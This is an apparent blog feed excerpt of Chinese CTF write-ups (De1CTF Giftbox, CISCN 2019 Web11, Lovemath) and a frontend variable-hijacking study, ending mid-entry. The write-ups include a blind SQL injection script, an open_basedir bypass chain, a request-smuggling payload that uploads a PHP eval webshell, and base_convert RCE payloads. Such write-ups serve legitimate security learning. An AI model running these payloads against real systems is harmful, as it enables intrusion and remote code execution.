title="Conclusion"></a>Conclusion</h2><p>在多年来一直被忽视的研究基础上，我引入了新的技术来取消服务器的同步，并演示了使用大量真实网站作为案例研究来利用结果的新方法。</p><p>通过这一点，我已经证明了请求走私是对Web的主要威胁，HTTP请求解析是一个安全关键的功能，容忍不明确的消息是危险的。我还发布了一个方法论和一个开源工具包，帮助人们审计请求走私，证明其影响，并以最小的风险获得奖金。</p><p>这一主题仍在研究中，因此我希望本出版物将有助于在未来几年内激发新的去同步技术和开发。</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf" target="_blank" rel="noopener">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></li><li><a href="https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack" target="_blank" rel="noopener">https://portswigger.net/blog/turbo-intruder-embracing-the-billion-request-attack</a></li><li><a href="https://tools.ietf.org/html/rfc2616#section-4.4" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc2616#section-4.4</a></li><li><a href="https://regilero.github.io/tag/Smuggling/" target="_blank" rel="noopener">https://regilero.github.io/tag/Smuggling/</a></li><li><a href="https://github.com/portswigger/desynchronize" target="_blank" rel="noopener">https://github.com/portswigger/desynchronize</a></li><li><a href="https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface" target="_blank" rel="noopener">https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface</a> 7. <a href="https://github.com/PortSwigger/param-miner" target="_blank" rel="noopener">https://github.com/PortSwigger/param-miner</a></li><li><a href="https://portswigger.net/blog/practical-web-cache-poisoning#hiddenroutepoisoning" target="_blank" rel="noopener">https://portswigger.net/blog/practical-web-cache-poisoning#hiddenroutepoisoning</a> </li><li><a href="https://portswigger.net/blog/http-desync-attacks" target="_blank" rel="noopener">https://portswigger.net/blog/http-desync-attacks</a></li></ol><h2 id="议题原文件"><a href="#议题原文件" class="headerlink" title="议题原文件"></a>议题原文件</h2><p><a href="https://pan.baidu.com/s/1ycNVD8Y3EIr4ayEnM9eqew" target="_blank" rel="noopener">https://pan.baidu.com/s/1ycNVD8Y3EIr4ayEnM9eqew</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door&quot;&gt;&lt;a href=&quot;#HTTP-Desync-Attacks-Smashing-into-the-Cell-Next-Door&quot; class=&quot;headerl
      
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="https://hpdoger.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF-Giftbox题解</title>
    <link href="https://hpdoger.cn/2019/08/06/De1CTF-Giftbox%E9%A2%98%E8%A7%A3/"/>
    <id>https://hpdoger.cn/2019/08/06/De1CTF-Giftbox题解/</id>
    <published>2019-08-05T16:00:00.000Z</published>
    <updated>2019-08-06T03:09:32.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="De1CTF-Giftbox题解"><a href="#De1CTF-Giftbox题解" class="headerlink" title="De1CTF-Giftbox题解"></a>De1CTF-Giftbox题解</h1><p>这次Web题的难度有阶层，<code>SSRF Me</code>是一个验签的绕过调用python的url_open进行ssrf请求、web4是一道n1ctf的原题，也懒得写wp了。还有两道比较难的，一道是ZSX师傅出的calc，统一三个后端的输出结果，过滤了括号。还有一道魔改了ciscn——2019的滑稽云，更改了溢出区的大小+外带结果。</p><p>最后就是Giftbox，不得不说，这是我见过最有小情调的ctf题目。做了一个伪unix页面，存在几个bash命令，和一个登陆功能，在登陆处存在sql注入(需要经过双因子认证)。比赛的时候没做出来，趁着赛题没关复现一下(顺便膜爆恩泽师傅orz..)</p><p><img src="http://static.zybuluo.com/1160307775/fa8kq5dg6w9kvypaq7gmtn5d/image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png" alt="image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png-979.2kB"></p><h2 id="双因子认证"><a href="#双因子认证" class="headerlink" title="双因子认证"></a>双因子认证</h2><p>这种认证第一次见，其实是调用pyotp模块去验证，随便输入会报错<br><img src="http://static.zybuluo.com/1160307775/yqxk48t3uo4tmzrgjt4d30kg/image_1dhfn759ve4c17uv1eqv1rpq876m.png" alt="image_1dhfn759ve4c17uv1eqv1rpq876m.png-203.2kB"></p><p>既然是前端发送验证请求，那就应该存在发送的ajax请求包。重点在开发者nodets和请求形式。它提示我们后端用了pyotp.zip的库去验证，而且在请求形式中把secret_key给了我们:<code>GAXG24JTMZXGKZBU</code></p><p><img src="http://static.zybuluo.com/1160307775/apyakaxxoilaq4ixhqk9ss1u/image_1dhfn9snj1dtme3d11eea3nm2v13.png" alt="image_1dhfn9snj1dtme3d11eea3nm2v13.png-165.3kB"></p><p>队内师傅提醒说，python3的pyotp模块也可以根据key生成验证<br><img src="http://static.zybuluo.com/1160307775/k5n1ymx6sv0p2188k8r01wr3/image_1dhfniaosich1f5b1ptm1jk8t4s1g.png" alt="image_1dhfniaosich1f5b1ptm1jk8t4s1g.png-140.6kB"></p><p>赛后看到天枢的师傅用xhr发送请求，即前端爆破就可以直接调用topt函数，也是种不错的思路，学习了。</p><p>接着就是一个简单的注入</p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>脚本如下，空格会导致程序判断为参数分隔符，所以用/**/替代</p><pre><code>#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsimport pyotp as pyotpimport stringtotp = pyotp.TOTP(&#39;GAXG24JTMZXGKZBU&#39;, 8, interval=5)def curl(payload):    r = requests.post(&#39;http://222.85.25.41:8090/shell.php&#39;, params={&#39;a&#39;: &#39;login admin\&#39;/**/and/**/(&#39; + payload + &#39;)/**/and/**/\&#39;1\&#39;=\&#39;1 admin&#39;, &#39;totp&#39;: totp.now()},                      data={&#39;dir&#39;: &#39;/&#39;, &#39;pos&#39;: &#39;/&#39;, &#39;filename&#39;: &#39;usage.md&#39;})    if &#39;password&#39; in r.text:        return True    else:        return Falsedef sqli():    for i in range(0, 2):        # db_data = &quot;SELECT/**/table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/LIMIT/**/{},1&quot;.format(        #     i)        # db_data = &quot;SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/and/**/table_name=\&#39;users\&#39;/**/LIMIT/**/{},1&quot;.format(        #     i)        db_data = &quot;select/**/password/**/from/**/giftbox.users/**/where/**/username/**/=/**/&#39;admin&#39;/**/limit/**/{},1&quot;.format(            i)        db_res = &quot;&quot;        for y in range(1, 64):            for c in string.printable:                db_res_payload = &quot;substr((&quot; + db_data + &quot;),%d,1)/**/=/**/&#39;%s&#39;&quot; % (y,c)                if curl(db_res_payload):                    db_res += c                    print(&quot;&gt; &quot; + db_res)                    break                else:pass            if db_res == &quot;&quot;:                breakif __name__ == &#39;__main__&#39;:    sqli()</code></pre><p>最后注入password字段得到一个hint为<code>hinT{g1ve_u_hi33en_c0mm3nd-sh0w_hiiintttt_23333}</code>，登陆成功同时提示</p><p><img src="http://static.zybuluo.com/1160307775/y3uyi4qslzpihrrxqpk5w7x1/image_1dhi8qiij18ve18991q95u1skfb1m.png" alt="image_1dhi8qiij18ve18991q95u1skfb1m.png-86kB"></p><h2 id="Bypass-open-dir"><a href="#Bypass-open-dir" class="headerlink" title="Bypass open_dir"></a>Bypass open_dir</h2><p>同时题目存在targeting命令，具体用法如下。结合之前的提示，推测是对每一个target进行一次eval的操作，因为targeting不允许存在双引号，所以用复杂变量${xxx(xxx)}的形式代替</p><p><img src="http://static.zybuluo.com/1160307775/4q86j7w2c84e21wjkvrk4bsr/image_1dhic3q29as9fln24sr29vts9.png" alt="image_1dhic3q29as9fln24sr29vts9.png-411.3kB"></p><p>但是没有执行到system(whoami)，推测是有open_dir，用网上的方法bypass:<a href="https://www.4hou.com/web/17357.html" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p><p>最后的payload如下，因为有长度限制，进行变量拼接</p><pre><code>targeting a chdirtargeting b csstargeting c {$a($b)}targeting d ini_settargeting e open_basedirtargeting f ..targeting g {$d($e,$f)}targeting h {$a($f)}targeting i {$a($f)}targeting j base64_targeting k decodetargeting l $j$ktargeting m Ly8vtargeting n {$l($m)}targeting o {$d($e,$n)}targeting p print_rtargeting q file_get_targeting r contentstargeting s $q$rtargeting t flagtargeting u {$p($s($t))}launch</code></pre><p><img src="http://static.zybuluo.com/1160307775/uefh1iezrvio5k3p7kn68w9o/image_1dhiec48lrbmsku1m3eu9pbjm2p.png" alt="image_1dhiec48lrbmsku1m3eu9pbjm2p.png-128.9kB"></p><p>再次膜恩泽师傅..</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;De1CTF-Giftbox题解&quot;&gt;&lt;a href=&quot;#De1CTF-Giftbox题解&quot; class=&quot;headerlink&quot; title=&quot;De1CTF-Giftbox题解&quot;&gt;&lt;/a&gt;De1CTF-Giftbox题解&lt;/h1&gt;&lt;p&gt;这次Web题的难度有阶层，&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2019 Final Web11题解</title>
    <link href="https://hpdoger.cn/2019/07/29/CISCN%202019%20Final%20Web11%E5%A4%8D%E7%9B%98/"/>
    <id>https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11复盘/</id>
    <published>2019-07-28T16:00:00.000Z</published>
    <updated>2019-07-30T01:21:54.656Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN-2019-Final-Web11复盘"><a href="#CISCN-2019-Final-Web11复盘" class="headerlink" title="CISCN 2019 Final Web11复盘"></a>CISCN 2019 Final Web11复盘</h1><p>题目本身结合了很多知识点，比赛没做出来，这里进行复盘分析。</p><p>题目地址：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a><br>题目源码：<a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git</a></p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>题目功能点很清晰：上传md文件、解析md文件为html(通过php拓展)</p><p>在Posts目录存在的.htaccess文件，表明md以php解析，不难想思路就是上传md来getshell</p><pre><code>AddType application/x-httpd-php .md</code></pre><p>但是上传是受到本地限制，也是这道题核心的考点。<br><img src="http://static.zybuluo.com/1160307775/tv820qzlzqhref82quabuss7/image_1dgtncrha8qnb4qjv51vlahbj26.png" alt="image_1dgtncrha8qnb4qjv51vlahbj26.png-120.9kB"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在分析post.php时发现函数pmark_include<br><img src="http://static.zybuluo.com/1160307775/ukd6lm5sgej2r6em6aiiu6co/image_1dgtnif22m4n18851r7irll15r42j.png" alt="image_1dgtnif22m4n18851r7irll15r42j.png-22.1kB"></p><p>它的作用是解析md为html，但在php官方文档并没有找到这个函数，说明是做题人自己编译出来的。在readme.md中同样提示<code>pmarkdown基于pandoc的php解析markdown拓展</code></p><p>当时猜测肯定是这个函数能进行类似于csrf/ssrf的操作，让服务端帮我们上传文件，后续放的提示也证明确实存在一个ssrf的点，只可惜网上基于pandoc的md解析几乎没有php手册。</p><p>不过题目给出了编译后的so文件，那么只能分析opcode(垃圾web狗哭了)。</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>先是逆向so文件。由于是c编译而成，直接拖到ida用f5跟，麻烦pwn师傅教了我一手。下面大致讲一下调用栈，也可能有不对的地方望指正。</p><p>看到sub_1850函数发起了本地请求，并且路径为path<br><img src="http://static.zybuluo.com/1160307775/bz59tutn4arpsk619ono03ml/image_1dgv2l7tc14839tceud1invijj30.png" alt="image_1dgv2l7tc14839tceud1invijj30.png-124.9kB"></p><p>追踪哪里调用了sub_1850并且path的值从何获取，最终追到发起requests时会调用的回调函数<code>zm_activate_pmarkdown</code><br><img src="http://static.zybuluo.com/1160307775/82o977t6qv6vr4liz6jc4h36/image_1dgv3d6mh1e31eao1pk91moij973d.png" alt="image_1dgv3d6mh1e31eao1pk91moij973d.png-28.8kB"></p><p>进行调用的语句如下，不难发现进行了一个对v16参数的判断<br><img src="http://static.zybuluo.com/1160307775/omm1bo25ugdkr1lrz04ioy09/image_1dgv3e7u2gt16cr1et2e8lu553q.png" alt="image_1dgv3e7u2gt16cr1et2e8lu553q.png-38.9kB"></p><p>这里就涉及到知识盲区了，由于不会ida的动态调试，没有确定参数值，这里只能从writeup入手分析条件判断的含义。</p><p>官方payload:</p><pre><code>data=&#39;504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a&#39;.replace(&#39;\n&#39;,&#39;&#39;)data=data.decode(&#39;hex&#39;)requests.post(url+&#39;/index.php&#39;,data={&#39;debug&#39;:&quot;sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n&quot;%data},timeout=timeout)</code></pre><p>这样不难理解判断的核心即是否存在debug参数，并且对v16取了24位地址偏移后的值传入下一层函数，也就是之前要最终的形参path。</p><p>在payload中的形式，相当于传递了两个http包，拼接后如下</p><pre><code>POST whatever HTTP/1.1Host: localhostConnection: Keep-AlivePOST /upload.php HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,en-US;q=0.7,en;q=0.3Referer: http://127.0.0.1:8080/index.php?act=uploadContent-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797Content-Length: 244Connection: closeUpgrade-Insecure-Requests: 1-----------------------------6693638881479522630623693797Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell&quot;Content-Type: text/php&lt;?php eval($_REQUEST[a]);-----------------------------6693638881479522630623693797--</code></pre><p>此时就可以把两个http包带入之前的path，构造一个完整的http包请求。而服务端在发送http请求时，会对请求包逐一发送。即先请求了<code>whatever</code>，建立http连接，connection:keep-alive 保持http的连接不被中断。</p><p>第二次请求data.decode(‘hex’)，让server帮我们请求Upload并上传md文件从而getshell</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>传了md就能解析php来getshell，只不过是要饶一个disable_function，预期解使用ld_preload去改变环境变量来bypass。不过有师傅提醒df过滤不全用popen也可以执行命令。</p><p>逆向功底太差了，有机会可以去抓个包分析一下debug参数的请求流程，最后膜出题师傅的知识渊博</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CISCN-2019-Final-Web11复盘&quot;&gt;&lt;a href=&quot;#CISCN-2019-Final-Web11复盘&quot; class=&quot;headerlink&quot; title=&quot;CISCN 2019 Final Web11复盘&quot;&gt;&lt;/a&gt;CISCN 2019 Fin
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>前端全局变量劫持</title>
    <link href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/"/>
    <id>https://hpdoger.cn/2019/07/02/前端全局变量劫持/</id>
    <published>2019-07-01T16:00:00.000Z</published>
    <updated>2019-07-14T12:58:52.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端全局变量劫持"><a href="#前端全局变量劫持" class="headerlink" title="前端全局变量劫持"></a>前端全局变量劫持</h1><p>最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，原文地址：<a href="http://blog.wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞" target="_blank" rel="noopener">前端中存在的变量劫持漏洞</a></p><p>先说一下鸡肋的点，这个变量的劫持也只能是把变量劫持为正常页面的window对象，并不能随意修改变量的值</p><h1 id="子页面获取"><a href="#子页面获取" class="headerlink" title="子页面获取"></a>子页面获取</h1><p>首先kun师傅介绍了三种父页面获取子页面windows对象的方式:</p><pre><code>document.getElementById(&quot;iframe1&quot;).contentWindow;window.frames[0]; window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id值”就代表iframe标签。也可以通过直接调用iframe内的name属性值获取该iframe的window对象<br><img src="http://static.zybuluo.com/1160307775/8n1kln6kltgkylriy0rutpd9/image_1df3psct91n0slcp85prp177u9.png" alt="image_1df3psct91n0slcp85prp177u9.png-60.3kB"></p><h1 id="利用filter模式删除变量"><a href="#利用filter模式删除变量" class="headerlink" title="利用filter模式删除变量"></a>利用filter模式删除变量</h1><p>无论是javascript还是调用标签，都无法覆盖已经定义的变量，但是却可以定义新的变量。</p><p>怎么让页面中出现未定义的全局变量呢？kun师傅提到chrome74之后，默认的xss auditor 从block模式编程了filter模式，可以利用这个删除掉页面中的代码。也就是说我们用一段xss代码触发chrome xss auditor删除xss引用的变量，从而达到替我们删除正常变量的目的。</p><p>这里简单介绍一下xss auditor</p><h2 id="XSS-Auditor"><a href="#XSS-Auditor" class="headerlink" title="XSS-Auditor"></a>XSS-Auditor</h2><p>XSS-Auditor是chrome默认开启的，也可以选择在header中关闭Auditor</p><pre><code>X-XSS-Protection: 0</code></pre><p>它的检测机制如文档中的描述<br><img src="http://static.zybuluo.com/1160307775/78neclm89yli79mwd4htps6z/image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png" alt="image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png-126.6kB"></p><p>XSS Auditor采用黑名单方法来识别请求参数中提供的危险字符和标签。它还将查询参数与内容进行匹配以识别注入点。如果查询参数无法与响应中的内容匹配，则不会触发Auditor。</p><p>不过文档也有提到，基于上下文的检测的局限性使Auditor无法预防一些针对应用层的payload，这里不做深究。</p><h2 id="删除变量demo"><a href="#删除变量demo" class="headerlink" title="删除变量demo"></a>删除变量demo</h2><pre><code>&lt;script&gt;var hpdoger = &quot;remove me&quot;;&lt;/script&gt;</code></pre><p>当访问的参数以危险标签的形式出现在response中时，就会触发xss-auditor，成功删除自定义的hpdoger变量。下图可以看到变量被成功删除</p><pre><code>http://localhost/iframe.html?xss=%3Cscript%3E%0A%20%20%20%20%20var%20hpdoger%20=%20%22remove%22;%0A%3C/script%3E</code></pre><p><img src="http://static.zybuluo.com/1160307775/c70k199x2qygcxi7z7nmf9fg/image_1df3uoatdojsl0fksa1e3b1nb21t.png" alt="image_1df3uoatdojsl0fksa1e3b1nb21t.png-112.7kB"></p><h1 id="bypass同源之iframe"><a href="#bypass同源之iframe" class="headerlink" title="bypass同源之iframe"></a>bypass同源之iframe</h1><p>众所周知，用iframe去加载子页面会被同源限制(除非是cors配置的白名单)<br><img src="http://static.zybuluo.com/1160307775/98cjog73vc1fxs6fuei5nypt/image_1df3vq1ivipk1qo3a383ao1lnd2n.png" alt="image_1df3vq1ivipk1qo3a383ao1lnd2n.png-93.8kB"></p><p><strong>如果儿子页面也存在iframe</strong>(划重点)，先通过操纵孙子c页面window对象来设置location，使其指向父页面a，这样父页面a和子页面b就同源了。之后再修改孙子页面c中window对象的name，其作用结果是：name作用域在子页面b的全局变量。</p><h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>这里不重复造轮子了，引用kun师傅的文章：<a href="https://xz.aliyun.com/t/5565#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/5565#toc-4</a></p><h2 id="孙子页面c"><a href="#孙子页面c" class="headerlink" title="孙子页面c"></a>孙子页面c</h2><p>任意的页面</p><h2 id="子页面b"><a href="#子页面b" class="headerlink" title="子页面b"></a>子页面b</h2><p><img src="http://static.zybuluo.com/1160307775/mz1lfmzmxftl49tvbpeh5lxn/image_1df5h2g811eg76b3bdo1v0b18dqm.png" alt="image_1df5h2g811eg76b3bdo1v0b18dqm.png-53.8kB"></p><h2 id="父页面a"><a href="#父页面a" class="headerlink" title="父页面a"></a>父页面a</h2><p>第一步很关键的一点就是修改c页面的location指向a。之后a页面就可以调用b的变量，同时通过iframe触发b页面的xss auditor<br><img src="http://static.zybuluo.com/1160307775/86zy0vdrthffjgmulc9qqu9c/image_1df5grfcl16f71ejc1j5upqr10re9.png" alt="image_1df5grfcl16f71ejc1j5upqr10re9.png-127.5kB"></p><p>第二步修改孙子页面c的name，从而帮b页面注册一个全局变量名为”hpdoger”<br><img src="http://static.zybuluo.com/1160307775/4qeb5di2v560f26o9jdr9804/image_1df5h8abti9j1bptl671to1e3213.png" alt="image_1df5h8abti9j1bptl671to1e3213.png-72.1kB"></p><p>这样就成功替换掉b页面的hpdoger变量，同时a页面也可以访问b页面这个全局变量hpdoger(但是不能访问b的其他变量。因为我们通过c页面做跳板，只能访问c的属性间接访问到b的变量，我叫他”同名法则”)。不过前文也提到了这个鸡肋的地方，就是一个变量替换成window对象，受用面很有限。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前端全局变量劫持&quot;&gt;&lt;a href=&quot;#前端全局变量劫持&quot; class=&quot;headerlink&quot; title=&quot;前端全局变量劫持&quot;&gt;&lt;/a&gt;前端全局变量劫持&lt;/h1&gt;&lt;p&gt;最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，
      
    
    </summary>
    
    
      <category term="XSS测试" scheme="https://hpdoger.cn/tags/XSS%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2019国赛Web线上题目Lovemath多解WP</title>
    <link href="https://hpdoger.cn/2019/04/23/2019%E5%9B%BD%E8%B5%9BWeb%E7%BA%BF%E4%B8%8A%E9%A2%98%E7%9B%AELovemath%E5%A4%9A%E8%A7%A3WP/"/>
    <id>https://hpdoger.cn/2019/04/23/2019国赛Web线上题目Lovemath多解WP/</id>
    <published>2019-04-22T16:00:00.000Z</published>
    <updated>2019-07-12T10:03:27.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p><h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><pre><code class="php">&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;])){     show_source(__FILE__); }else{     //例子 c=20-1     $content = $_GET[&#39;c&#39;];     if (strlen($content) &gt;= 80) {         die(&quot;太长了不会算&quot;);     }     $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];     foreach ($blacklist as $blackitem) {         if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {             die(&quot;请不要输入奇奇怪怪的字符&quot;);         }     }     //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp     $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);     foreach ($used_funcs[0] as $func) {         if (!in_array($func, $whitelist)) {             die(&quot;请不要输入奇奇怪怪的函数&quot;);         }     }     //帮你算出答案     eval(&#39;echo &#39;.$content.&#39;;&#39;); }</code></pre><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p><p>也就是说只允许Eval使用白名单的函数做字符串</p><p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p><p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p><p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p><h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p><pre><code>$input = hexdec(bin2hex(&quot;system(&#39;cat /flag&#39;);&quot;))$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</code></pre><p>完整转换是这样：</p><pre><code>base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</code></pre><p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p><pre><code>base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</code></pre><p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p><p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p><h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p><pre><code>$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})</code></pre><p>解码出来是<code>system(getallheaders(){9})</code></p><p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p><h1 id="POC-3"><a href="#POC-3" class="headerlink" 